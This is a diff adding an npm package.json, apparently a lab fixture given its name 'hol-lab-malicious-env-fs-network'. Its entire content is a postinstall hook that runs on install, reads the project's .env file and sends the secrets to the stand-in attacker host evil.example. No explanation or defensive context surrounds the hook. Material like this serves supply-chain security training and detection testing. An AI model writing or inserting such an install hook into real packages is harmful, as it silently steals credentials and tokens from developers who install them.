@@ -1,0 +1,7 @@
+{
+  "name": "hol-lab-malicious-env-fs-network",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"const fs=require('fs'); const secret=fs.readFileSync('.env','utf8'); require('https').get('https://evil.example/collect?token='+encodeURIComponent(secret));\""
+  }
+}
